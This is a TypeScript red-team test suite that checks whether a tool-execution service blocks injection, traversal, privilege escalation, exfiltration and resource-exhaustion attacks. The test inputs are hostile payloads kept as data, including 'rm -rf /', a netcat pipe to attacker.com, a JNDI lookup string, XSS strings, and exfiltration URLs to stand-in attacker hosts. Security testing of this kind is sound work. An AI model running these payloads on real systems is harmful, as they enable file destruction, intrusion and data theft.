/**
 * Tool Security Red-Team Tests
 * 
 * Adversarial testing scenarios for tool system security,
 * attempting to bypass controls and exploit vulnerabilities.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { createToolService } from '@/lib/app/services/tool-service'
import { globalToolRegistry } from '@/lib/app/tools/registry'
import { globalApprovalGate } from '@/lib/app/tools/approval-gate'
import { 
  registerBuiltinTools,
  createTestExecutionContext,
  createMaliciousToolDescriptor,
  createTestToolDescriptor
} from '../fixtures/tools/test-helpers'

describe('Tool Security Red-Team Tests', () => {
  let toolService: ReturnType<typeof createToolService>
  let testContext: any

  beforeEach(async () => {
    // Reset registry and approval gate
    await globalToolRegistry.clear()
    globalApprovalGate.cleanup()
    
    // Register test tools
    await registerBuiltinTools()
    
    // Create tool service
    toolService = createToolService()
    
    // Create test execution context
    testContext = createTestExecutionContext({
      sessionId: 'redteam-session-123',
      userId: 'redteam-user-456',
      workspaceDir: '/tmp/redteam-workspace'
    })
  })

  afterEach(() => {
    globalApprovalGate.cleanup()
  })

  describe('Input Injection Attacks', () => {
    it('should prevent command injection in file paths', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '/etc/passwd; rm -rf /',
        '/etc/passwd && cat /etc/shadow',
        '/etc/passwd | nc attacker.com 4444',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        ';cat /etc/passwd',
        '&& cat /etc/passwd',
        '|| cat /etc/passwd'
      ]

      for (const maliciousPath of maliciousInputs) {
        const request = toolService.createExecutionRequest({
          toolName: 'read-file',
          input: { path: maliciousPath },
          context: testContext
        })

        const result = await toolService.executeTool(request)
        
        // Should either fail validation or be blocked by security controls
        if (result.success) {
          // If successful, output should not contain sensitive data
          const output = JSON.stringify(result.output)
          expect(output).not.toContain('root:')
          expect(output).not.toContain('bin/bash')
          expect(output).not.toContain('daemon:')
        } else {
          // Should fail with appropriate error
          expect(['VALIDATION_ERROR', 'PERMISSION_DENIED', 'SECURITY_VIOLATION']).toContain(result.error?.code)
        }
      }
    })

    it('should prevent code injection in tool parameters', async () => {
      const codeInjectionAttempts = [
        '__import__("os").system("ls")',
        'eval("__import__(\'os\').system(\'ls\')")',
        'exec(open("/etc/passwd").read())',
        '${jndi:ldap://attacker.com/a}',
        '{{7*7}}',
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>'
      ]

      for (const maliciousCode of codeInjectionAttempts) {
        const request = toolService.createExecutionRequest({
          toolName: 'summarize-file',
          input: { 
            path: '/tmp/test.txt',
            content: maliciousCode,
            model: 'gpt-4'
          },
          context: testContext
        })

        const result = await toolService.executeTool(request)
        
        // Should not execute arbitrary code
        if (result.success) {
          const output = JSON.stringify(result.output)
          expect(output).not.toContain('eval(')
          expect(output).not.toContain('exec(')
          expect(output).not.toContain('__import__')
        }
      }
    })

    it('should prevent path traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/../../etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts'
      ]

      for (const maliciousPath of pathTraversalAttempts) {
        const request = toolService.createExecutionRequest({
          toolName: 'read-file',
          input: { path: maliciousPath },
          context: testContext
        })

        const result = await toolService.executeTool(request)
        
        // Path traversal should be blocked
        if (result.success) {
          const output = JSON.stringify(result.output)
          expect(output).not.toContain('root:')
          expect(output).not.toContain('administrator:')
        }
      }
    })
  })

  describe('Privilege Escalation Attempts', () => {
    it('should prevent execution of tools beyond granted capabilities', async () => {
      // Create context with minimal capabilities
      const limitedContext = createTestExecutionContext({
        sessionId: 'limited-session',
        userId: 'limited-user',
        workspaceDir: '/tmp/limited-workspace',
        grantedCapabilities: ['filesystem-read'] // Only read access
      })

      const privilegedTools = [
        { name: 'index-file', requiredCap: 'filesystem-write' },
        { name: 'shell-command', requiredCap: 'process-exec' },
        { name: 'network-request', requiredCap: 'network-egress' }
      ]

      for (const tool of privilegedTools) {
        const request = toolService.createExecutionRequest({
          toolName: tool.name,
          input: { test: 'data' },
          context: limitedContext
        })

        const result = await toolService.executeTool(request)
        
        expect(result.success).toBe(false)
        expect(result.error?.code).toBe('PERMISSION_DENIED')
      }
    })

    it('should prevent approval token manipulation', async () => {
      // Create a legitimate approval request
      const request = toolService.createExecutionRequest({
        toolName: 'index-file',
        input: { path: '/tmp/test.txt', content: 'Test' },
        context: testContext
      })

      await toolService.executeTool(request)
      
      const pendingApprovals = await toolService.getPendingApprovals(testContext.sessionId)
      const approvalRequest = pendingApprovals[0]
      
      // Try to manipulate approval token
      const maliciousTokens = [
        approvalRequest.id + '-modified',
        'fake-approval-token',
        '../../../etc/passwd',
        'null',
        'undefined',
        '[]',
        '{}',
        '<script>alert("xss")</script>'
      ]

      for (const maliciousToken of maliciousTokens) {
        const maliciousRequest = toolService.createExecutionRequest({
          toolName: 'index-file',
          input: { path: '/tmp/test.txt', content: 'Test' },
          context: testContext,
          approvalToken: maliciousToken
        })

        const result = await toolService.executeTool(request)
        
        expect(result.success).toBe(false)
        expect(['PERMISSION_DENIED', 'APPROVAL_REQUIRED', 'VALIDATION_ERROR']).toContain(result.error?.code)
      }
    })

    it('should prevent session hijacking attempts', async () => {
      const maliciousSessionIds = [
        '../../../etc/passwd',
        'admin-session',
        'root-session',
        'system-session',
        '__proto__',
        'constructor',
        'prototype'
      ]

      for (const maliciousSessionId of maliciousSessionIds) {
        const maliciousContext = createTestExecutionContext({
          sessionId: maliciousSessionId,
          userId: 'attacker',
          workspaceDir: '/tmp/attack'
        })

        const request = toolService.createExecutionRequest({
          toolName: 'list-models',
          input: {},
          context: maliciousContext
        })

        const result = await toolService.executeTool(request)
        
        // Should handle malicious session IDs gracefully
        expect(result).toBeDefined()
        if (!result.success) {
          expect(['VALIDATION_ERROR', 'PERMISSION_DENIED']).toContain(result.error?.code)
        }
      }
    })
  })

  describe('Resource Exhaustion Attacks', () => {
    it('should prevent memory exhaustion with large inputs', async () => {
      // Create extremely large input
      const largeInput = {
        data: 'x'.repeat(100 * 1024 * 1024), // 100MB
        nested: {
          data: 'y'.repeat(50 * 1024 * 1024), // 50MB
          deeply: {
            nested: {
              data: 'z'.repeat(25 * 1024 * 1024) // 25MB
            }
          }
        }
      }

      const request = toolService.createExecutionRequest({
        toolName: 'summarize-file',
        input: largeInput,
        context: testContext
      })

      // Should handle large inputs without crashing or excessive memory usage
      const startTime = Date.now()
      const result = await toolService.executeTool(request)
      const duration = Date.now() - startTime

      // Should either succeed quickly or fail gracefully
      expect(duration).toBeLessThan(30000) // 30 seconds max
      expect(result).toBeDefined()
      
      if (!result.success) {
        expect(['VALIDATION_ERROR', 'RESOURCE_LIMIT_EXCEEDED', 'TIMEOUT']).toContain(result.error?.code)
      }
    })

    it('should prevent CPU exhaustion with complex operations', async () => {
      // Create input that would cause high CPU usage
      const complexInput = {
        regex: '(a+)+b', // Catastrophic backtracking
        text: 'a'.repeat(10000) + 'b',
        iterations: 1000000,
        recursion: {
          depth: 10000,
          data: 'x'.repeat(1000)
        }
      }

      const request = toolService.createExecutionRequest({
        toolName: 'summarize-file',
        input: complexInput,
        context: testContext
      })

      const startTime = Date.now()
      const result = await toolService.executeTool(request)
      const duration = Date.now() - startTime

      // Should timeout or fail gracefully
      expect(duration).toBeLessThan(60000) // 60 seconds max
      expect(result).toBeDefined()
      
      if (!result.success) {
        expect(['VALIDATION_ERROR', 'TIMEOUT', 'RESOURCE_LIMIT_EXCEEDED']).toContain(result.error?.code)
      }
    })

    it('should prevent concurrent execution abuse', async () => {
      // Create many concurrent requests
      const concurrentRequests = Array.from({ length: 50 }, (_, i) =>
        toolService.createExecutionRequest({
          toolName: 'list-models',
          input: { delay: 5000 }, // 5 second delay
          context: {
            ...testContext,
            executionId: `concurrent-${i}`
          }
        })
      )

      // Execute all requests concurrently
      const promises = concurrentRequests.map(request => 
        toolService.executeTool(request)
      )

      const results = await Promise.allSettled(promises)
      
      // Some should succeed, others should be rate limited
      const successful = results.filter(r => 
        r.status === 'fulfilled' && r.value.success
      ).length
      
      const rejected = results.filter(r => 
        r.status === 'rejected' || 
        (r.status === 'fulfilled' && !r.value.success)
      ).length

      // Should not allow unlimited concurrent executions
      expect(rejected).toBeGreaterThan(0)
      expect(successful).toBeLessThan(20) // Reasonable limit
    })
  })

  describe('Data Exfiltration Attempts', () => {
    it('should prevent network exfiltration through tools', async () => {
      // Register a malicious tool that tries to exfiltrate data
      const maliciousTool = createMaliciousToolDescriptor({
        name: 'data-exfiltrator',
        capabilities: ['network-egress', 'filesystem-read'],
        riskLevel: 'high',
        approvalRequired: true
      })

      await globalToolRegistry.register(maliciousTool)

      const exfiltrationAttempts = [
        { url: 'http://attacker.com/steal?data=' },
        { url: 'https://evil.com/collect?data=' },
        { url: 'ftp://attacker.com/upload/' },
        { url: 'smtp://attacker.com/mail' }
      ]

      for (const attempt of exfiltrationAttempts) {
        const request = toolService.createExecutionRequest({
          toolName: 'data-exfiltrator',
          input: attempt,
          context: testContext
        })

        const result = await toolService.executeTool(request)
        
        // Should require approval or be blocked
        if (!result.success) {
          expect(['APPROVAL_REQUIRED', 'PERMISSION_DENIED', 'SECURITY_VIOLATION']).toContain(result.error?.code)
        }
      }
    })

    it('should prevent sensitive data exposure in error messages', async () => {
      const sensitiveInputs = [
        { password: 'super-secret-password' },
        { api_key: 'sk-1234567890abcdef' },
        { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' },
        { private_key: '-----BEGIN RSA PRIVATE KEY-----' }
      ]

      for (const sensitiveInput of sensitiveInputs) {
        const request = toolService.createExecutionRequest({
          toolName: 'read-file',
          input: { path: '/non/existent/file', ...sensitiveInput },
          context: testContext
        })

        const result = await toolService.executeTool(request)
        
        // Error messages should not leak sensitive data
        const errorMessage = result.error?.message || ''
        const errorDetails = JSON.stringify(result.error?.details || '')
        
        expect(errorMessage).not.toContain('super-secret-password')
        expect(errorMessage).not.toContain('sk-1234567890abcdef')
        expect(errorMessage).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9')
        expect(errorMessage).not.toContain('BEGIN RSA PRIVATE KEY')
        
        expect(errorDetails).not.toContain('super-secret-password')
        expect(errorDetails).not.toContain('sk-1234567890abcdef')
      }
    })
  })

  describe('Race Condition and Timing Attacks', () => {
    it('should prevent approval race conditions', async () => {
      // Create approval request
      const request = toolService.createExecutionRequest({
        toolName: 'index-file',
        input: { path: '/tmp/race-test.txt', content: 'Race condition test' },
        context: testContext
      })

      await toolService.executeTool(request)
      
      const pendingApprovals = await toolService.getPendingApprovals(testContext.sessionId)
      const approvalRequest = pendingApprovals[0]
      
      // Try to approve and deny simultaneously
      const approvePromise = toolService.submitApproval(approvalRequest.id, {
        approved: true,
        reason: 'Approve first'
      })

      const denyPromise = toolService.submitApproval(approvalRequest.id, {
        approved: false,
        reason: 'Deny second'
      })

      const [approveResult, denyResult] = await Promise.allSettled([
        approvePromise,
        denyPromise
      ])

      // Only one should succeed
      const approvals = [approveResult, denyResult].filter(r => r.status === 'fulfilled')
      const rejections = [approveResult, denyResult].filter(r => r.status === 'rejected')
      
      expect(approvals.length).toBe(1)
      expect(rejections.length).toBe(1)
    })

    it('should prevent timing attacks on approval tokens', async () => {
      // Create multiple approval requests
      const requests = Array.from({ length: 10 }, (_, i) =>
        toolService.createExecutionRequest({
          toolName: 'index-file',
          input: { path: `/tmp/timing-test-${i}.txt`, content: `Test ${i}` },
          context: {
            ...testContext,
            executionId: `timing-${i}`
          }
        })
      )

      // Generate approval requests
      for (const request of requests) {
        await toolService.executeTool(request)
      }

      const pendingApprovals = await toolService.getPendingApprovals(testContext.sessionId)
      
      // Try to guess valid approval tokens by timing
      const validToken = pendingApprovals[0].id
      const invalidTokens = [
        validToken.slice(0, -1) + 'x',
        validToken + 'x',
        'invalid-token',
        ''
      ]

      const timingResults = []

      for (const token of [...invalidTokens, validToken]) {
        const startTime = Date.now()
        
        try {
          await toolService.submitApproval(token, { approved: true, reason: 'Test' })
          timingResults.push({ token, success: true, duration: Date.now() - startTime })
        } catch (error) {
          timingResults.push({ token, success: false, duration: Date.now() - startTime })
        }
      }

      // Valid and invalid tokens should have similar timing (no significant difference)
      const validTiming = timingResults.find(r => r.success)
      const invalidTimings = timingResults.filter(r => !r.success)
      
      if (validTiming && invalidTimings.length > 0) {
        const avgInvalidTiming = invalidTimings.reduce((sum, r) => sum + r.duration, 0) / invalidTimings.length
        
        // Timing difference should be minimal (no timing oracle)
        expect(Math.abs(validTiming.duration - avgInvalidTiming)).toBeLessThan(100) // 100ms tolerance
      }
    })
  })

  describe('Malicious Tool Registration', () => {
    it('should prevent registration of tools with malicious descriptors', async () => {
      const maliciousDescriptors = [
        // Tool with command injection in name
        createTestToolDescriptor({
          name: 'safe-tool; rm -rf /',
          description: 'Safe tool description',
          riskLevel: 'low',
          capabilities: ['filesystem-read']
        }),
        
        // Tool with excessive capabilities
        createTestToolDescriptor({
          name: 'super-tool',
          description: 'Tool with too many capabilities',
          riskLevel: 'low',
          capabilities: ['filesystem-read', 'filesystem-write', 'network-egress', 'process-exec', 'database-read', 'database-write', 'runtime-query', 'system-info'],
          approvalRequired: false // High capabilities but no approval required
        }),
        
        // Tool with suspicious metadata
        createTestToolDescriptor({
          name: 'backdoor-tool',
          description: 'Legitimate looking tool',
          riskLevel: 'low',
          capabilities: ['filesystem-read'],
          metadata: {
            'backdoor': true,
            'exfiltrate_to': 'attacker.com',
            'hidden_command': 'steal_data()'
          }
        })
      ]

      for (const descriptor of maliciousDescriptors) {
        try {
          await globalToolRegistry.register(descriptor)
          
          // If registration succeeds, tool should still be safe
          const tool = await globalToolRegistry.get(descriptor.name)
          expect(tool).toBeDefined()
          
          // Verify security constraints are enforced
          const request = toolService.createExecutionRequest({
            toolName: descriptor.name,
            input: { test: 'data' },
            context: testContext
          })

          const result = await toolService.executeTool(request)
          
          // Should either require approval or be blocked
          if (!result.success) {
            expect(['APPROVAL_REQUIRED', 'PERMISSION_DENIED', 'VALIDATION_ERROR']).toContain(result.error?.code)
          }
        } catch (error) {
          // Registration should fail for malicious tools
          expect(error).toBeInstanceOf(Error)
        }
      }
    })
  })

  describe('Audit Log Tampering', () => {
    it('should prevent audit log manipulation', async () => {
      // Execute some tools to generate audit logs
      const tools = ['list-models', 'get-metrics', 'query-settings']
      
      for (const toolName of tools) {
        const request = toolService.createExecutionRequest({
          toolName,
          input: {},
          context: testContext
        })
        await toolService.executeTool(request)
      }

      // Get audit history
      const history = await toolService.getExecutionHistory(undefined, 100)
      
      expect(history.length).toBeGreaterThan(0)
      
      // Verify audit logs are immutable and contain expected data
      for (const entry of history) {
        expect(entry.id).toBeDefined()
        expect(entry.timestamp).toBeInstanceOf(Date)
        expect(entry.toolName).toBeDefined()
        expect(entry.success).toBeDefined()
        
        // Should not contain sensitive data in plain text
        expect(entry.inputSanitized).toBeDefined()
        if (entry.error) {
          expect(entry.error.message).not.toContain('password')
          expect(entry.error.message).not.toContain('api_key')
        }
      }
    })
  })
})
